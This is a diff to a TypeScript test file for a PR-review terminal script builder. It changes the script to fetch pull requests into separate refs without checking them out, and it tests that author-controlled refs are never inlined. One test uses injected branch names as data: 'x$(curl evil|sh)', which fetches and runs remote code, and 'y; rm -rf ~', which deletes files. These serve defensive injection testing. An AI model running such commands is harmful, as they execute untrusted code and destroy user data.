@@ -28,21 +28,22 @@ function prItem(overrides: Partial<WatchItem> = {}): WatchItem {
 }
 
 describe("buildReviewTerminalScript", () => {
-  test("checks out a safe branch and guards a dirty working tree", () => {
+  test("fetches the PR into refs/attn/ without checking it out", () => {
     const script = buildReviewTerminalScript(prItem());
     expect(script).toContain("cd '/Users/dev/work/api'");
-    expect(script).toContain("git status --porcelain");
-    expect(script).toContain("git checkout feature/retry");
-    expect(script).toContain("set -e");
+    expect(script).toContain(
+      'git fetch origin "+refs/pull/42/head:refs/attn/pr-42" "+refs/heads/main:refs/attn/base-42"',
+    );
+    expect(script).toContain("git diff refs/attn/base-42...refs/attn/pr-42");
+    expect(script).not.toMatch(/git (checkout|switch|worktree|pull|stash)/);
     expect(script).toContain("exec zsh");
   });
 
-  test("never inlines unsafe author-controlled refs; falls back to the PR number", () => {
+  test("never inlines unsafe author-controlled refs", () => {
     const script = buildReviewTerminalScript(prItem({ headBranch: "x$(curl evil|sh)", baseBranch: "y; rm -rf ~" }));
     expect(script).not.toContain("curl evil");
     expect(script).not.toContain("rm -rf ~");
-    expect(script).toContain("git fetch origin pull/42/head:pr-42");
-    expect(script).toContain("git checkout main");
+    expect(script).toContain('"+refs/heads/main:refs/attn/base-42"');
   });
 
   test("shell-quotes free text like titles so quotes cannot escape", () => {
